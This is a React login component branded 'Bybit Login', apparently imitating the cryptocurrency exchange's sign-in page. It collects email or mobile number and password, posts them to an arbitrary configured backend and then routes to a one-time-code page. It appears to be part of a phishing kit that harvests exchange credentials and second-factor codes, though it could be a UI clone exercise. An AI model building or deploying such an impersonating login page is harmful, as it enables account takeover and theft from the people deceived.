import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/home.css"; // Custom styling file
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import logo from "../assets/logo.svg";
import * as yup from "yup";
import axios from "axios";
import BASE_URL from "../components/urls";
import FormErrMsg from "../components/FormErrMsg"; // Error message component
import { LuLock } from "react-icons/lu";
import { AiOutlineMail } from "react-icons/ai";
import { CiMobile1 } from "react-icons/ci";
import { IoEyeOffOutline, IoEyeOutline } from "react-icons/io5";

// Email login schema
const emailSchema = yup.object().shape({
  email: yup
    .string()
    .email("Invalid email format")
    .required("Email is required"),
  password: yup.string().required("Password is required"),
});

// Mobile login schema
const mobileSchema = yup.object().shape({
  mobile: yup
    .string()
    .matches(/^\d+$/, "Mobile number must be digits only")
    .min(10, "Mobile number must be at least 10 digits")
    .required("Mobile number is required"),
  password: yup.string().required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [activeTab, setActiveTab] = useState("email"); // Email tab by default
  const [showPassword, setShowPassword] = useState(false);

  // Email form setup
  const {
    register: registerEmail,
    handleSubmit: handleSubmitEmail,
    formState: { errors: emailErrors },
  } = useForm({
    resolver: yupResolver(emailSchema),
  });

  // Mobile form setup
  const {
    register: registerMobile,
    handleSubmit: handleSubmitMobile,
    formState: { errors: mobileErrors },
  } = useForm({
    resolver: yupResolver(mobileSchema),
  });

  // Submit function for email form
  const submitEmailForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/loginWithEmail`, data) // Endpoint for email login
      .then((response) => {
        console.log(response.data);
        navigate("/otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  // Submit function for mobile form
  const submitMobileForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/loginWithMobile`, data) // Endpoint for mobile login
      .then((response) => {
        console.log(response.data);
        navigate("/otp");
      })
      .catch((error) => {
        console.error("There was an error!", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  return (
    <div className="loginPage">
      <div className="loginHeader">
        <div>
          <img src={logo} alt="Logo" />
        </div>
        <div className="signUp">Bybit Login</div>
      </div>

      {/* Tabs for Email/Mobile selection */}
      <div className="tabs">
        <div
          className={`tab ${activeTab === "email" ? "active" : ""}`}
          onClick={() => setActiveTab("email")}
        >
          Email
        </div>
        <div
          className={`tab ${activeTab === "mobile" ? "active" : ""}`}
          onClick={() => setActiveTab("mobile")}
        >
          Mobile Number
        </div>
      </div>

      <div className="loginForm">
        {/* Email Form */}
        {activeTab === "email" && (
          <form onSubmit={handleSubmitEmail(submitEmailForm)}>
            <div className="formInput">
              <AiOutlineMail /> {/* Email Icon */}
              <input
                name="email"
                type="email"
                placeholder="Email"
                {...registerEmail("email")}
              />
            </div>
            <FormErrMsg errors={emailErrors} inputName="email" />

            <div className="formInput passwordInput">
              <LuLock /> {/* Lock Icon */}
              <input
                name="password"
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                {...registerEmail("password")}
              />
              <span
                className="togglePassword"
                onClick={() => setShowPassword(!showPassword)}
              >
                {showPassword ? <IoEyeOutline /> : <IoEyeOffOutline />}
              </span>
            </div>
            <FormErrMsg errors={emailErrors} inputName="password" />

            <div className="forgotPassword">
              <a href="#">Forgot Password?</a>
            </div>
            <button type="submit" disabled={loading}>
              {loading ? "Loading..." : "Login Now"}
            </button>
          </form>
        )}

        {/* Mobile Form */}
        {activeTab === "mobile" && (
          <form onSubmit={handleSubmitMobile(submitMobileForm)}>
            <div className="formInput">
              <CiMobile1 /> {/* Mobile Icon */}
              <input
                name="mobile"
                type="tel" // Restrict input to numeric types
                placeholder="Mobile Number"
                {...registerMobile("mobile")}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, ""); // Remove non-digit characters
                  e.target.value = value;
                }}
              />
            </div>
            <FormErrMsg errors={mobileErrors} inputName="mobile" />

            <div className="formInput passwordInput">
              <LuLock /> {/* Lock Icon */}
              <input
                name="password"
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                {...registerMobile("password")}
              />
              <span
                className="togglePassword"
                onClick={() => setShowPassword(!showPassword)}
              >
                {showPassword ? <IoEyeOutline /> : <IoEyeOffOutline />}
              </span>
            </div>
            <FormErrMsg errors={mobileErrors} inputName="password" />

            <div className="forgotPassword">
              <a href="#">Forgot Password?</a>
            </div>
            <button type="submit" disabled={loading}>
              {loading ? "Loading..." : "Login Now"}
            </button>
          </form>
        )}
      </div>
    </div>
  );
};

export default Home;
